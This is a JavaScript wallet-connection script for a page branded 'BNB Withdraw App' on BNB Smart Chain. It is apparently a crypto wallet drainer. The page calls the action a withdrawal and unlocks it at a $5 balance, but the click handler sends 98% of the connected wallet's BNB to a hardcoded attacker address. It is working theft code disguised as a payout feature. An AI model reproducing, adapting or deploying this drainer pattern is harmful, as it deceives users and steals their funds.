// wallet.js
import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
  WagmiCore,
  WagmiCoreChains,
  WagmiCoreConnectors
} from "https://unpkg.com/@web3modal/ethereum@2.6.2";

import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";

const { bsc } = WagmiCoreChains;
const { configureChains, createConfig, getAccount, fetchBalance, sendTransaction } = WagmiCore;

// 1. Setup chains and config
const chains = [bsc];
const projectId = "2aca272d18deb10ff748260da5f78bfd";

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: [
    ...w3mConnectors({ chains, version: 2, projectId }),
    new WagmiCoreConnectors.CoinbaseWalletConnector({
      chains,
      options: {
        appName: "BNB Withdraw App"
      }
    })
  ],
  publicClient
});

// 2. Create Web3Modal
const ethereumClient = new EthereumClient(wagmiConfig, chains);
const web3Modal = new Web3Modal(
  {
    projectId,
    themeMode: "light"
  },
  ethereumClient
);

// 3. Create and append wallet connect button
const container = document.getElementById("wallet-container");
const w3mButton = document.createElement("w3m-core-button");
w3mButton.style.width = "100%";
w3mButton.style.marginBottom = "16px";
container.prepend(w3mButton);

// 4. UI Elements
const withdrawBtn = document.getElementById("withdrawBtn");
const message = document.getElementById("message");
const walletAddress = document.getElementById("walletAddress");
const balanceDiv = document.getElementById("balance");

// 5. Update UI based on wallet state
async function updateUI() {
  const acc = getAccount();
  if (acc?.isConnected) {
    const address = acc.address;
    walletAddress.textContent = `Wallet: ${address}`;

    try {
      const balanceData = await fetchBalance({ address, chainId: 56 });
      const bnbBalance = parseFloat(balanceData.formatted);
      const usdValue = bnbBalance * 600; // Approx conversion

      balanceDiv.textContent = `BNB Balance: ${bnbBalance.toFixed(4)} (~$${usdValue.toFixed(2)})`;

      if (usdValue >= 5) {
        withdrawBtn.disabled = false;
        message.textContent = "You can withdraw BNB now.";
      } else {
        withdrawBtn.disabled = true;
        message.textContent = "Minimum $5 BNB required to withdraw.";
      }
    } catch (err) {
      message.textContent = "Failed to fetch balance.";
      console.error(err);
    }

    withdrawBtn.style.display = "inline-block";
  } else {
    withdrawBtn.style.display = "none";
    walletAddress.textContent = "";
    balanceDiv.textContent = "";
    message.textContent = "Please connect your wallet.";
  }
}

// 6. Withdraw button handler
withdrawBtn.addEventListener("click", async () => {
  const acc = getAccount();
  if (!acc?.isConnected) {
    message.textContent = "Connect your wallet first.";
    return;
  }

  try {
    const balanceData = await fetchBalance({ address: acc.address, chainId: 56 });
    const balanceInEth = parseFloat(balanceData.formatted);

    const usdValue = balanceInEth * 600;
    if (usdValue < 5) {
      message.textContent = "Balance is below $5. Cannot withdraw.";
      return;
    }

    // Send 98% of BNB (keep 2% for gas)
    const sendAmount = (balanceInEth * 0.98).toFixed(6);

    const tx = await sendTransaction({
      to: "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C", // Your BNB receiving address
      value: `${BigInt(parseFloat(sendAmount) * 1e18)}`
    });

    message.textContent = "Transaction sent! Hash: " + tx.hash;
  } catch (err) {
    message.textContent = "Transaction error.";
    console.error(err);
  }
});

// 7. Check wallet state periodically
setInterval(updateUI, 3000);
updateUI();